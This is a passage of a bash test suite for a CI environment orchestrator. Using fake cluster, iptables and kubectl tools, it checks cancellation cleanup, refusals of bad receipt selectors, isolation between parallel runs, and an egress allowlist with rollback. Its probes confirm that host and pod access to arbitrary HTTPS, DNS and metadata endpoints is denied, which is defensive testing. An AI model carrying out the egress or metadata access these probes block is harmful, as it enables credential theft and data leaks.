  [[ $(grep -Ec "^destroy --force ${cluster} " "$FAKE_NSC_LOG") == 1 ]] ||
    fail "$label repeated cancellation did not destroy its exact cluster exactly once"
  [[ ! -e $FAKE_NSC_ROOT/instances/$cluster/live ]] ||
    fail "$label repeated cancellation left its cluster live"
  grep -Eq '^list --all -o json ' "$FAKE_NSC_LOG" ||
    fail "$label repeated cancellation did not positively prove absence"
  staging_stdout=$(find "$RUNNER_TEMP/diene-namespace" -path '*/staging/stdout' -print -quit)
  [[ -n $staging_stdout ]] || fail "$label repeated cancellation retained no staging stdout"
  [[ $(grep -Fxc 'DieneNscSshSessionReady:v1' "$staging_stdout") == 1 ]] ||
    fail "$label repeated cancellation flushed its partial attempt evidence more than once"
  jq -e '.outcome == "Fail" and .reasonCode == "OrchestratorCancelled" and
    .namespaceLifecycle.destroy.outcome == "Pass" and
    .namespaceLifecycle.absence.outcome == "Pass"' "$DIENE_CORE_REPORT" >/dev/null ||
    fail "$label repeated cancellation lost its original red result or its exact cleanup"
  ok "$label repeated cancellation keeps one reason, one destroy, proven absence, and status $expected"
}
cancel_lifecycle_repeated 5112 TERM TERM 143
cancel_lifecycle_repeated 5113 TERM INT 143
cancel_lifecycle_repeated 5114 INT TERM 130

printf '== late cleanup closes debt but cannot rewrite red ==\n'

expect_lifecycle_failure 5120 absence-fail NamespaceAbsenceUnproven
late_id=$(find "$FAILURE_NSC_ROOT/instances" -name meta.json -exec jq -r '.cluster_id' {} \;)
late_report_digest=$(sha256sum "$DIENE_CORE_REPORT" | awk '{print $1}')
if (cd -- "$work" && FAKE_NSC_SCENARIO=happy ./scripts/ci/environment-k3d-run.sh cleanup) \
  >"$scratch/late-cleanup.out" 2>"$scratch/late-cleanup.err"; then
  fail 'late cleanup rewrote a failed lifecycle green'
fi
assert_contains "$scratch/late-cleanup.err" LateCleanupCannotRewriteRun
[[ $(grep -Ec "^destroy --force ${late_id} " "$FAILURE_LOG") == 2 ]] ||
  fail 'late cleanup did not remain scoped to the same exact cluster_id'
late_record=$(find "$RUNNER_TEMP/diene-namespace" -path '*/final-proof/late-cleanup.json' -print -quit)
jq -e --arg cluster "$late_id" '.outcome == "Fail" and
  .reasonCode == "LateExactCleanupCannotRewriteRun" and .clusterId == $cluster and
  .absenceProven == true and .lateCleanupCanRewrite == false' "$late_record" >/dev/null ||
  fail 'late cleanup did not emit durable exact-id red evidence'
[[ $(sha256sum "$DIENE_CORE_REPORT" | awk '{print $1}') == "$late_report_digest" ]] ||
  fail 'late cleanup mutated the original failed report'
ok 'late exact cleanup can close debt but never rewrite the failed run green'

printf '== receipt sweep refuses malformed, cross-run, empty, and prefix selectors ==\n'

fake_pls=$scratch/fake-pls
cat >"$fake_pls" <<'PLS'
#!/usr/bin/env bash
set -euo pipefail
printf '%q ' "$@" >>"${FAKE_PLS_LOG:?}"
printf '\n' >>"${FAKE_PLS_LOG:?}"
exit 0
PLS
chmod 0755 "$fake_pls"
fake_pls_log=$scratch/fake-pls.log
: >"$fake_pls_log"

valid_receipt=$(find "$RUNNER_TEMP/diene-receipts" -maxdepth 1 -type f -name '*.json' -print -quit)
receipt_id=$(jq -er '.owner.receiptId' "$valid_receipt")

expect_sweep_refusal() {
  local reason=${1:?reason required} receipt_dir=${2:?receipt dir required}
  local repository_id=${3:?repository id required} run_id=${4:?run id required}
  local run_attempt=${5:?run attempt required} selected_receipt=${6-}
  if (cd -- "$work" && DIENE_RECEIPT_DIR="$receipt_dir" DIENE_PLS_BIN="$fake_pls" \
    FAKE_PLS_LOG="$fake_pls_log" ./scripts/ci/environment-receipt-sweep.sh \
      --repository-id "$repository_id" --run-id "$run_id" --run-attempt "$run_attempt" \
      --receipt-id "$selected_receipt") >"$scratch/sweep.out" 2>"$scratch/sweep.err"; then
    fail "receipt sweep unexpectedly accepted $reason case"
  fi
  grep -Fq -- "$reason" "$scratch/sweep.err" || {
    sed -n '1,120p' "$scratch/sweep.err" >&2
    fail "receipt sweep did not report $reason"
  }
  ok "receipt sweep refuses $reason"
}

malformed_dir=$scratch/receipts-malformed
install -d -m 0700 "$malformed_dir"
jq 'del(.namespace.duration)' "$valid_receipt" >"$malformed_dir/receipt.json"
expect_sweep_refusal SchemaValidationFailed "$malformed_dir" 12345 5120 1 "$receipt_id"

cross_run_dir=$scratch/receipts-cross-run
install -d -m 0700 "$cross_run_dir"
cp "$valid_receipt" "$cross_run_dir/receipt.json"
expect_sweep_refusal CleanupDebt "$cross_run_dir" 12345 999999 1 "$receipt_id"

empty_dir=$scratch/receipts-empty
install -d -m 0700 "$empty_dir"
expect_sweep_refusal CleanupDebt "$empty_dir" 12345 5120 1 "$receipt_id"

receipt_prefix=${receipt_id%-*}
expect_sweep_refusal CleanupDebt "$cross_run_dir" 12345 5120 1 "$receipt_prefix"
expect_sweep_refusal InputContractInvalid "$cross_run_dir" 12345 5120 1 ''
[[ ! -s $fake_pls_log ]] || fail 'a refused receipt selector invoked Garden teardown'
ok 'every refused receipt selector performs zero deletion'

printf '== two parallel tuples cannot cross read, write, or destroy ==\n'

parallel_runner_a=$scratch/parallel-runner-6101
parallel_runner_b=$scratch/parallel-runner-6102
parallel_nsc_a=$scratch/parallel-nsc-6101
parallel_nsc_b=$scratch/parallel-nsc-6102

parallel_run() {
  local run_id=${1:?run id required} runner=${2:?runner required} nsc_root=${3:?nsc root required}
  prepare_run "$run_id" ditto-build-local "$runner" "$nsc_root"
  run_orchestrator ssh-delay
}

parallel_run 6101 "$parallel_runner_a" "$parallel_nsc_a" \
  >"$scratch/parallel-a.out" 2>"$scratch/parallel-a.err" &
parallel_pid_a=$!
parallel_run 6102 "$parallel_runner_b" "$parallel_nsc_b" \
  >"$scratch/parallel-b.out" 2>"$scratch/parallel-b.err" &
parallel_pid_b=$!
if ! wait "$parallel_pid_a"; then
  sed -n '1,160p' "$scratch/parallel-a.err" >&2
  fail 'parallel tuple A failed'
fi
if ! wait "$parallel_pid_b"; then
  sed -n '1,160p' "$scratch/parallel-b.err" >&2
  fail 'parallel tuple B failed'
fi

parallel_id_a=$(find "$parallel_nsc_a/instances" -name meta.json -exec jq -r '.cluster_id' {} \;)
parallel_id_b=$(find "$parallel_nsc_b/instances" -name meta.json -exec jq -r '.cluster_id' {} \;)
[[ -n $parallel_id_a && -n $parallel_id_b && $parallel_id_a != "$parallel_id_b" ]] ||
  fail 'parallel tuples did not receive distinct exact cluster IDs'
[[ $(find "$parallel_nsc_a/instances" -name meta.json | wc -l) == 1 &&
  $(find "$parallel_nsc_b/instances" -name meta.json | wc -l) == 1 ]] ||
  fail 'a parallel fake Namespace root observed another tuple instance'

assert_parallel_log_scope() {
  local log=${1:?log required} exact=${2:?exact id required} other=${3:?other id required}
  awk -v exact="$exact" '
    $1 == "instance" && ($2 == "upload" || $2 == "download") && $3 != exact {exit 1}
    $1 == "ssh" && $2 != exact {exit 1}
    $1 == "destroy" && $3 != exact {exit 1}
  ' "$log" || fail "$log contains a cross-tuple read/write/destroy selector"
  ! grep -Fq -- "$other" "$log" || fail "$log mentions the other tuple cluster ID"
  [[ $(grep -Ec "^destroy --force ${exact} " "$log") == 1 ]] ||
    fail "$log does not destroy its exact tuple exactly once"
}

assert_parallel_log_scope "$parallel_nsc_a/log" "$parallel_id_a" "$parallel_id_b"
assert_parallel_log_scope "$parallel_nsc_b/log" "$parallel_id_b" "$parallel_id_a"
jq -e --arg run 6101 '.owner.runId == $run' \
  "$parallel_nsc_a/instances/$parallel_id_a/fs/run/diene-ci/receipt.json" >/dev/null ||
  fail 'parallel tuple A read or received another tuple receipt'
jq -e --arg run 6102 '.owner.runId == $run' \
  "$parallel_nsc_b/instances/$parallel_id_b/fs/run/diene-ci/receipt.json" >/dev/null ||
  fail 'parallel tuple B read or received another tuple receipt'
jq -e --arg cluster "$parallel_id_a" --arg run 6101 \
  '.workflow.runId == $run and .instance.clusterId == $cluster' \
  "$parallel_runner_a/diene-environment-report.v1.json" >/dev/null ||
  fail 'parallel tuple A report crossed identity'
jq -e --arg cluster "$parallel_id_b" --arg run 6102 \
  '.workflow.runId == $run and .instance.clusterId == $cluster' \
  "$parallel_runner_b/diene-environment-report.v1.json" >/dev/null ||
  fail 'parallel tuple B report crossed identity'
[[ ! -e $parallel_nsc_a/instances/$parallel_id_a/live &&
  ! -e $parallel_nsc_b/instances/$parallel_id_b/live ]] ||
  fail 'a parallel exact instance survived cleanup'
ok 'parallel tuples have distinct IDs, receipts, reports, roots, and exact cleanup selectors'

printf '== interim iptables-nft host/pod enforcement ==\n'

policy_tools=$scratch/policy-tools
policy_state=$scratch/policy-tables
install -d -m 0700 "$policy_tools" "$policy_state"

cat >"$policy_tools/iptables4" <<'TABLE'
#!/usr/bin/env bash
set -euo pipefail
family=4
[[ $(basename -- "$0") != *6 ]] || family=6
state=${FAKE_TABLE_STATE:?}/$family
install -d -m 0700 "$state"
printf '%q ' "$@" >>"${FAKE_TABLE_LOG:?}"
printf '\n' >>"${FAKE_TABLE_LOG:?}"
signature="$family $*"
if [[ -n ${FAKE_TABLE_FAIL_REGEX:-} && $signature =~ ${FAKE_TABLE_FAIL_REGEX} ]]; then exit 88; fi
if [[ ${1:-} == --version ]]; then
  printf 'iptables v1.8.13 (nf_tables)\n'
  exit 0
fi
if [[ ${1:-} == -w && ${2:-} == 5 ]]; then shift 2; fi
operation=${1:-}
shift || true
case $operation in
  -N)
    chain=${1:?}
    [[ ! -e $state/chain-$chain ]] || exit 1
    : >"$state/chain-$chain"
    ;;
  -A)
    chain=${1:?}
    shift
    [[ -f $state/chain-$chain ]] || exit 1
    printf -- '-A %s' "$chain" >>"$state/chain-$chain"
    printf ' %q' "$@" >>"$state/chain-$chain"
    printf '\n' >>"$state/chain-$chain"
    ;;
  -I)
    base=${1:?}
    position=${2:?}
    jump=${3:?}
    chain=${4:?}
    [[ $position == 1 && $jump == -j && ($base == OUTPUT || $base == FORWARD) ]] || exit 1
    printf -- '-A %s -j %s\n' "$base" "$chain" >>"$state/hooks-$base"
    ;;
  -D)
    base=${1:?}
    jump=${2:?}
    chain=${3:?}
    [[ $jump == -j && ($base == OUTPUT || $base == FORWARD) ]] || exit 1
    hooks=$state/hooks-$base
    [[ -f $hooks ]] || exit 1
    awk -v expected="-A $base -j $chain" '$0 != expected' "$hooks" >"$hooks.tmp"
    mv "$hooks.tmp" "$hooks"
    ;;
  -F)
    chain=${1:?}
    [[ -f $state/chain-$chain ]] || exit 1
    : >"$state/chain-$chain"
    ;;
  -X)
    chain=${1:?}
    [[ -f $state/chain-$chain ]] || exit 1
    rm -f -- "$state/chain-$chain"
    ;;
  -S)
    selected=${1:-}
    if [[ $selected == OUTPUT || $selected == FORWARD ]]; then
      [[ ! -f $state/hooks-$selected ]] || sed -n '1,200p' "$state/hooks-$selected"
      exit 0
    fi
    [[ -n $selected && -f $state/chain-$selected ]] || exit 1
    sed -n '1,240p' "$state/chain-$selected"
    ;;
  *) exit 127 ;;
esac
TABLE
cp "$policy_tools/iptables4" "$policy_tools/iptables6"
chmod 0755 "$policy_tools/iptables4" "$policy_tools/iptables6"

cat >"$policy_tools/ip" <<'IP'
#!/usr/bin/env bash
set -euo pipefail
case "$*" in
  '-o -4 route show')
    printf '%s\n' '10.0.0.0/30 dev eth0 proto kernel' '10.142.0.0/16 dev cni0' 'default via 10.0.0.1 dev eth0'
    ;;
  '-o -6 route show')
    printf '%s\n' 'fd00:142::/64 dev cni0' 'fe80::/64 dev eth0' 'default via fe80::1 dev eth0'
    ;;
  *) exit 127 ;;
esac
IP

cat >"$policy_tools/kubectl" <<'KUBECTL'
#!/usr/bin/env bash
set -euo pipefail
printf '%q ' "$@" >>"${FAKE_KUBECTL_LOG:?}"
printf '\n' >>"${FAKE_KUBECTL_LOG:?}"
case "$*" in
  'get nodes -o json')
    jq -n --argjson podCidrs "${FAKE_NODE_POD_CIDRS:-[\"10.142.0.0/16\",\"fd00:142::/64\"]}" '
      {items:[{spec:{podCIDR:($podCidrs | map(select(contains(":" ) | not))[0]),podCIDRs:$podCidrs},
      status:{conditions:[{type:"Ready",status:"True"}],capacity:{cpu:"16",memory:"32Gi"}}}]}'
    ;;
  'get servicecidrs.networking.k8s.io kubernetes -o json')
    [[ ${FAKE_SERVICE_CIDR_MODE:-happy} != unavailable ]] || exit 1
    jq -n --arg api "${FAKE_SERVICE_CIDR_API:-networking.k8s.io/v1}" \
      --arg kind "${FAKE_SERVICE_CIDR_KIND:-ServiceCIDR}" \
      --arg name "${FAKE_SERVICE_CIDR_NAME:-kubernetes}" \
      --argjson cidrs "${FAKE_SERVICE_CIDRS:-[\"10.143.0.0/16\"]}" '
      {apiVersion:$api,kind:$kind,metadata:{name:$name},spec:{cidrs:$cidrs}}'
    ;;
  'get ingress -A -o json' | 'get gateway -A -o json') printf '%s\n' '{"items":[]}' ;;
  'get service -A -o json')
    printf '%s\n' '{"items":[{"metadata":{"name":"kgateway"},"spec":{"type":"ClusterIP","externalIPs":[]}}]}'
    ;;
  *) exit 127 ;;
esac
KUBECTL

cat >"$policy_tools/resolver" <<'RESOLVER'
#!/usr/bin/env bash
set -euo pipefail
family=${1:?}
dns=${2:?}
[[ $dns == api.example.test || $dns == vendor.example.test || $dns == ghcr.io ]] || exit 1
case $family in
  ipv4) printf '%s\n' "${FAKE_RESOLVER_IPV4:-203.0.113.8}" ;;
  ipv6) printf '%s\n' '2001:db8::8' ;;
  *) exit 127 ;;
esac
RESOLVER
chmod 0755 "$policy_tools/ip" "$policy_tools/kubectl" "$policy_tools/resolver"

policy_table_log=$scratch/policy-table.log
policy_kubectl_log=$scratch/policy-kubectl.log
policy_l7_log=$scratch/policy-l7.log
policy_probe_log=$scratch/policy-probe.log
ipv6_enabled_path=$scratch/ipv6-enabled
ipv6_disabled_path=$scratch/ipv6-disabled
: >"$policy_table_log"
: >"$policy_kubectl_log"
: >"$policy_l7_log"
: >"$policy_probe_log"
printf '0\n' >"$ipv6_enabled_path"
printf '1\n' >"$ipv6_disabled_path"

prepare_run 7001
policy_evidence=$scratch/policy-evidence
install -d -m 0700 "$policy_evidence"
jq -n '{network:{serviceCidrs:["10.143.0.0/16"]}}' >"$policy_evidence/preflight.json"
(
  cd -- "$work"
  # shellcheck source=/dev/null
  source ./scripts/ci/environment-lib.sh
  diene_validate_inputs
  export DIENE_NSC_CLUSTER_ID=cluster-policy-7001
  export DIENE_PREFLIGHT_EVIDENCE="$policy_evidence/preflight.json"
  export DIENE_KUBECTL_BIN="$policy_tools/kubectl"
  export DIENE_IPTABLES_BIN="$policy_tools/iptables4"
  export DIENE_IP6TABLES_BIN="$policy_tools/iptables6"
  export DIENE_EGRESS_RESOLVER_BIN="$policy_tools/resolver"
  export DIENE_IPV6_DISABLE_PATH="$ipv6_enabled_path"
  export FAKE_TABLE_STATE="$policy_state" FAKE_TABLE_LOG="$policy_table_log"
  export FAKE_KUBECTL_LOG="$policy_kubectl_log" FAKE_L7_LOG="$policy_l7_log"
  export FAKE_PROBE_LOG="$policy_probe_log" SSH_CONNECTION='192.0.2.10 4242 10.0.0.2 22'
  export PATH="$policy_tools:$PATH"
  export DIENE_EVIDENCE_STAGING="$policy_evidence/staging"
  install -d -m 0700 "$DIENE_EVIDENCE_STAGING"
  diene_prepare_egress_contract "$policy_evidence/contract.json"
  diene_resolve_egress_contract "$policy_evidence/contract.json" "$policy_evidence/resolved.json"
  diene_preflow_start
  diene_apply_interim_policy "$policy_evidence/resolved.json" "$policy_evidence/policy.json" \
    "$policy_evidence/l7.json"
  diene_verify_hostile_egress "$policy_evidence/hostile-probes.json"
  diene_verify_endpoint_law "$policy_evidence/endpoint.json"
  diene_remove_interim_policy
) >"$scratch/policy.out" 2>"$scratch/policy.err" || {
  sed -n '1,200p' "$scratch/policy.err" >&2
  fail 'the measured interim policy happy path failed'
}

jq -e '.mode == "allowlist" and .profileId == "ditto-build-local-v1" and
  .platformStatus == "platform per-instance policy pending (support ask #4)" and
  (.entries | length) == 1 and .entries[0].dns == "api.example.test" and
  .entries[0].sni == "api.example.test" and .entries[0].port == 443 and
  .entries[0].methods == ["GET","POST"]' "$policy_evidence/contract.json" >/dev/null ||
  fail 'connected egress contract lost the exact support stamp or DNS/SNI/port/method boundary'
jq -e '.resolvedEntries[0].addresses.ipv4 == ["203.0.113.8"] and
  .resolvedEntries[0].addresses.ipv6 == ["2001:db8::8"]' "$policy_evidence/resolved.json" >/dev/null ||
  fail 'resolver output was not bound into the policy contract'
jq -e '.mechanism == "interim-in-guest-iptables-nft" and .backend == "nf_tables" and
  .platformStatus == "platform per-instance policy pending (support ask #4)" and
  .outputChain != .forwardChain and .ipv6Armed == true and .podCidr == "10.142.0.0/16" and
  .pod6Cidrs == ["fd00:142::/64"] and .serviceCidr == "10.143.0.0/16" and
  .orchestrationException == "exact-ssh-4-tuple" and
  .orchestrationTupleSource == "ssh-environment" and .applied == true' \
  "$policy_evidence/policy.json" >/dev/null || fail 'policy transcript lacks host/FORWARD/IPv6/exact-SSH facts'
# The primary source binds the same canonical tuple, a measured selected count,
# and a deterministic digest of the exact admitted one-line value, with no
# retained artifact because no kernel socket table was read.
jq -e --arg digest "sha256:$(printf '%s' '192.0.2.10 4242 10.0.0.2 22' | sha256sum | awk '{print $1}')" '
  .orchestrationTuple == {clientAddress:"192.0.2.10",clientPort:4242,
    serverAddress:"10.0.0.2",serverPort:22} and
  .orchestrationFlowCount == 1 and
  .orchestrationObservationDigest == $digest and
  .orchestrationObservationArtifact == null' \
  "$policy_evidence/policy.json" >/dev/null ||
  fail 'the ssh-environment transcript did not bind the exact tuple, count, and observation digest'
jq -e '.outcome == "Pass" and .defaultDenied == true and .dnsBound == true and
  .sniBound == true and .methodsBound == true' "$policy_evidence/l7.json" >/dev/null ||
  fail 'L7 enforcer did not attest the full declaration boundary'
jq -e 'length == 6 and
  ([.[].id] | sort) == ["host-arbitrary-https-denial","host-metadata-denial",
    "pod-arbitrary-https-denial","pod-dns-denial","pod-metadata-denial",
    "preexisting-flow-transition-denial"] and
  all(.outcome == "Pass" and .required == true and .reasonCode == "AdapterObservedDenial")' \
  "$policy_evidence/hostile-probes.json" >/dev/null || fail 'host and actual-pod hostile proof is incomplete'
jq -e '.outcome == "Pass" and .reasonCode == "LoopbackOnlyNoIngress" and
  .namespaceEndpointUsed == false' "$policy_evidence/endpoint.json" >/dev/null ||
  fail 'loopback/no-ingress endpoint law was not proved'
grep -Fq -- '-I OUTPUT 1 -j' "$policy_table_log" || fail 'host OUTPUT policy was not hooked'
grep -Fq -- '-I FORWARD 1 -j' "$policy_table_log" || fail 'pod FORWARD policy was not hooked'
grep -Eq -- '-p tcp -s 10\.0\.0\.2 -d 192\.0\.2\.10 --sport 22 --dport 4242 -m conntrack --ctstate ESTABLISHED -j ACCEPT' \
  "$policy_table_log" || fail 'SSH exception is not the narrow observed orchestration flow'
grep -Eq -- '-A DIO_[0-9a-f]+ -p tcp -d 203\.0\.113\.8 --dport 443 -j ACCEPT' \
  "$policy_table_log" || fail 'host L3/L4 allowlist did not bind the resolved IPv4 endpoint'
grep -Eq -- '-A DIF_[0-9a-f]+ -s 10\.142\.0\.0/16 -p tcp -d 203\.0\.113\.8 --dport 443 -j ACCEPT' \
  "$policy_table_log" || fail 'pod L3/L4 allowlist did not bind the resolved IPv4 endpoint'
grep -Eq -- '-A DI6O_[0-9a-f]+ -p tcp -d 2001:db8::8 --dport 443 -j ACCEPT' \
  "$policy_table_log" || fail 'host IPv6 allowlist did not bind the resolved endpoint'
grep -Eq -- '-A DI6F_[0-9a-f]+ -s fd00:142::/64 -p tcp -d 2001:db8::8 --dport 443 -j ACCEPT' \
  "$policy_table_log" || fail 'pod IPv6 allowlist did not bind the resolved endpoint'
! grep -Fq -- 'ESTABLISHED,RELATED' "$policy_table_log" || fail 'a blanket established-flow exemption was installed'
! grep -Eq -- '0\.0\.0\.0/0|::/0' "$policy_table_log" || fail 'an unrestricted L3 route was allowed'
! grep -Fq -- '-d 10.0.0.0/30' "$policy_table_log" ||
  fail 'an unrelated connected IPv4 LAN was accepted'
! grep -Fq -- '-d fe80::/64' "$policy_table_log" ||
  fail 'an unrelated connected IPv6 LAN was accepted'
for scope in preexisting-open preexisting-transition host pod; do
  grep -Fq -- "--scope $scope" "$policy_probe_log" || fail "hostile probe scope $scope was not exercised"
done
grep -Fq -- "--image $CANARY_IMAGE" "$policy_probe_log" || fail 'pod probe did not use the immutable canary image'
[[ $(grep -Fc -- '--image ' "$policy_probe_log") == 1 ]] ||
  fail 'an adapter scope other than pod received the canary image argument'
policy_receipt_id=$(
  cd -- "$work"
  # shellcheck source=/dev/null
  source ./scripts/ci/environment-lib.sh
  diene_receipt_id
)
for scope in preexisting-open preexisting-transition host pod; do
  transcript=$policy_evidence/staging/egress-probe/$scope.json
  expected_probe_reason=AdapterObservedDenial
  [[ $scope != preexisting-open ]] || expected_probe_reason=AdapterObservedFlowEstablished
  jq -e --arg scope "$scope" --arg profile ditto-build-local-v1 \
    --arg cluster cluster-policy-7001 --arg receipt "$policy_receipt_id" \
    --arg reason "$expected_probe_reason" '
    (keys | sort) == ["apiVersion","clusterId","observations","profileId","receiptId","scope"] and
    .apiVersion == "diene.atomi.cloud/ci-egress-probe/v1" and .scope == $scope and
    .profileId == $profile and .clusterId == $cluster and .receiptId == $receipt and
    all(.observations[];
      (keys | sort) == ["id","outcome","reasonCode","required"] and
      .outcome == "Pass" and .required == true and .reasonCode == $reason)
  ' "$transcript" >/dev/null || fail "$scope adapter transcript lost exact tuple/key/outcome binding"
done
grep -Fq -- 'apply --profile ditto-build-local-v1' "$policy_l7_log" || fail 'L7 policy did not arm'
grep -Fq -- 'remove --profile ditto-build-local-v1' "$policy_l7_log" || fail 'L7 policy did not remove'
output_chain=$(jq -r '.outputChain' "$policy_evidence/policy.json")
forward_chain=$(jq -r '.forwardChain' "$policy_evidence/policy.json")
output6_chain=$(jq -r '.output6Chain' "$policy_evidence/policy.json")
forward6_chain=$(jq -r '.forward6Chain' "$policy_evidence/policy.json")
for chain in "$output_chain" "$forward_chain" "$output6_chain" "$forward6_chain"; do
  [[ ! -e $policy_state/4/chain-$chain && ! -e $policy_state/6/chain-$chain ]] ||
    fail "receipt-scoped policy chain $chain survived removal"
done
for family in 4 6; do
  for hook in OUTPUT FORWARD; do
    [[ ! -s $policy_state/$family/hooks-$hook ]] || fail "IPv$family $hook hook survived removal"
  done
done
if rg -n '(^|[[:space:]])nsc[[:space:]]+egress|egress[[:space:]]+policy[[:space:]]+(create|update)' \
  "$template_root/scripts/ci" "$template_root/.github/workflows" >"$scratch/tenant-policy"; then
  sed -n '1,120p' "$scratch/tenant-policy" >&2
  fail 'active code mutates a tenant-wide Namespace egress policy'
fi
ok 'iptables-nft and exact machine-readable adapter transcripts bind host/pod probes, receipt, and full removal'

printf '== partial policy transactions roll back completely ==\n'

assert_policy_state_absent() {
  local state=${1:?state required} label=${2:?label required}
  ! find "$state" -type f -name 'chain-*' -print -quit | grep -q . ||
    fail "$label left a receipt-scoped chain"
  while IFS= read -r hook; do
    [[ ! -s $hook ]] || fail "$label left a receipt-scoped hook"
  done < <(find "$state" -type f -name 'hooks-*' -print)
}

policy_failure_case() {
  local run_id=${1:?run id required} label=${2:?label required} table_regex=${3-}
  local l7_complete=${4:-true} expected=${5:-InterimPolicyUnavailable}
  local pod_cidrs=${6:-'["10.142.0.0/16","fd00:142::/64"]'} ipv6_disabled=${7:-0}
  prepare_run "$run_id"
  local state=$scratch/policy-failure-$label tables=$scratch/policy-failure-$label.log
  local l7_log=$scratch/policy-failure-$label-l7.log evidence=$scratch/policy-failure-$label-evidence
  install -d -m 0700 "$state" "$evidence"
  : >"$tables"
  : >"$l7_log"
  printf '%s\n' "$ipv6_disabled" >"$evidence/ipv6-disabled"
  jq -n '{network:{serviceCidrs:["10.143.0.0/16"]}}' >"$evidence/preflight.json"
  if (
    cd -- "$work"
    # shellcheck source=/dev/null
    source ./scripts/ci/environment-lib.sh
    diene_validate_inputs
    export DIENE_NSC_CLUSTER_ID="cluster-$label-$run_id"
    export DIENE_PREFLIGHT_EVIDENCE="$evidence/preflight.json"
    export DIENE_KUBECTL_BIN="$policy_tools/kubectl"
    export DIENE_IPTABLES_BIN="$policy_tools/iptables4"
    export DIENE_IP6TABLES_BIN="$policy_tools/iptables6"
    export DIENE_EGRESS_RESOLVER_BIN="$policy_tools/resolver"
    export DIENE_IPV6_DISABLE_PATH="$evidence/ipv6-disabled" FAKE_NODE_POD_CIDRS="$pod_cidrs"
    export FAKE_TABLE_STATE="$state" FAKE_TABLE_LOG="$tables"
    export FAKE_TABLE_FAIL_REGEX="$table_regex" FAKE_KUBECTL_LOG="$policy_kubectl_log"
    export FAKE_L7_LOG="$l7_log" FAKE_L7_COMPLETE="$l7_complete"
    export SSH_CONNECTION='192.0.2.10 4242 10.0.0.2 22'
    diene_prepare_egress_contract "$evidence/contract.json"
    diene_resolve_egress_contract "$evidence/contract.json" "$evidence/resolved.json"
    diene_apply_interim_policy "$evidence/resolved.json" "$evidence/policy.json" "$evidence/l7.json"
  ) >"$scratch/policy-failure-$label.out" 2>"$scratch/policy-failure-$label.err"; then
    fail "$label partial policy unexpectedly succeeded"
  fi
  grep -Fq -- "$expected" "$scratch/policy-failure-$label.err" || {
    sed -n '1,200p' "$scratch/policy-failure-$label.err" >&2
    fail "$label did not retain $expected"
  }
  assert_policy_state_absent "$state" "$label"
  POLICY_FAILURE_TABLE_LOG=$tables
  POLICY_FAILURE_L7_LOG=$l7_log
  ok "$label failure proves complete receipt-scoped rollback"
}

policy_failure_case 7101 partial-ipv4 '^4 -w 5 -I FORWARD'
grep -Fq -- '-D OUTPUT -j DIO_' "$POLICY_FAILURE_TABLE_LOG" ||
  fail 'partial IPv4 rollback did not remove the first installed hook'

policy_failure_case 7102 partial-ipv6 '^6 -w 5 -I FORWARD'
grep -Fq -- '-D OUTPUT -j DI6O_' "$POLICY_FAILURE_TABLE_LOG" ||
  fail 'partial IPv6 rollback did not remove the first IPv6 hook'
grep -Fq -- '-D OUTPUT -j DIO_' "$POLICY_FAILURE_TABLE_LOG" ||
  fail 'partial IPv6 rollback did not also remove the complete IPv4 transaction'

policy_failure_case 7103 l7-attestation '' false ConnectedEgressInterfaceUnavailable
grep -Fq -- 'apply --profile ditto-build-local-v1' "$POLICY_FAILURE_L7_LOG" ||
  fail 'L7 failure injection never reached the apply boundary'
grep -Fq -- 'remove --profile ditto-build-local-v1' "$POLICY_FAILURE_L7_LOG" ||
  fail 'L7 failure rollback did not remove the attempted enforcer state'

policy_failure_case 7104 ipv6-no-pod-cidr '' true InterimPolicyUnavailable \
  '["10.142.0.0/16"]' 0
assert_contains "$scratch/policy-failure-ipv6-no-pod-cidr.err" \
  'host IPv6 is enabled but no IPv6 pod CIDR was observed'
! grep -Eq -- '-A DI6F_[0-9a-f]+ -j RETURN' "$POLICY_FAILURE_TABLE_LOG" ||
  fail 'the empty-pod6-CIDR case completed an unenforced IPv6 forwarding chain'
ok 'partial IPv4/IPv6, L7, and enabled-host/empty-pod6 failures leave no hook or chain'

prepare_run 7105
ipv6_disabled_state=$scratch/policy-ipv6-disabled-state
ipv6_disabled_evidence=$scratch/policy-ipv6-disabled-evidence
ipv6_disabled_log=$scratch/policy-ipv6-disabled.log
install -d -m 0700 "$ipv6_disabled_state" "$ipv6_disabled_evidence"
: >"$ipv6_disabled_log"
jq -n '{network:{serviceCidrs:["10.143.0.0/16"]}}' >"$ipv6_disabled_evidence/preflight.json"
(
  cd -- "$work"
  # shellcheck source=/dev/null
  source ./scripts/ci/environment-lib.sh
  diene_validate_inputs
  export DIENE_NSC_CLUSTER_ID=cluster-ipv6-disabled-7105
  export DIENE_PREFLIGHT_EVIDENCE="$ipv6_disabled_evidence/preflight.json"
  export DIENE_KUBECTL_BIN="$policy_tools/kubectl" DIENE_IPTABLES_BIN="$policy_tools/iptables4"
  export DIENE_IP6TABLES_BIN="$policy_tools/iptables6" DIENE_EGRESS_RESOLVER_BIN="$policy_tools/resolver"
  export DIENE_IPV6_DISABLE_PATH="$ipv6_disabled_path" FAKE_NODE_POD_CIDRS='["10.142.0.0/16"]'
  export FAKE_TABLE_STATE="$ipv6_disabled_state" FAKE_TABLE_LOG="$ipv6_disabled_log"
  export FAKE_KUBECTL_LOG="$policy_kubectl_log" FAKE_L7_LOG="$policy_l7_log"
  export SSH_CONNECTION='192.0.2.10 4242 10.0.0.2 22'
  diene_prepare_egress_contract "$ipv6_disabled_evidence/contract.json"
  diene_resolve_egress_contract "$ipv6_disabled_evidence/contract.json" \
    "$ipv6_disabled_evidence/resolved.json"
  diene_apply_interim_policy "$ipv6_disabled_evidence/resolved.json" \
    "$ipv6_disabled_evidence/policy.json" "$ipv6_disabled_evidence/l7.json"
  diene_remove_interim_policy
) >"$scratch/policy-ipv6-disabled.out" 2>"$scratch/policy-ipv6-disabled.err" || {
  sed -n '1,160p' "$scratch/policy-ipv6-disabled.err" >&2
  fail 'the explicitly IPv6-disabled control refused an empty pod6 CIDR set'
}
jq -e '.ipv6Armed == false and .pod6Cidrs == [] and .applied == true' \
  "$ipv6_disabled_evidence/policy.json" >/dev/null ||
  fail 'the IPv6-disabled control transcript misreported IPv6 enforcement'
assert_policy_state_absent "$ipv6_disabled_state" ipv6-disabled-control
ok 'an explicitly IPv6-disabled host permits no pod6 CIDR and still proves complete removal'

printf '== admitted built-in Kubernetes admission and the derived create selector ==\n'

k3s_admission_case() (
  cd -- "$work"
  # shellcheck source=/dev/null
  source ./scripts/ci/environment-lib.sh
  if (($# >= 1)); then
    diene_k3s_admission "$1"
  else
    diene_k3s_admission
  fi
)

k3s_admission_empty_environment_case() (
  cd -- "$work"
  # shellcheck source=/dev/null
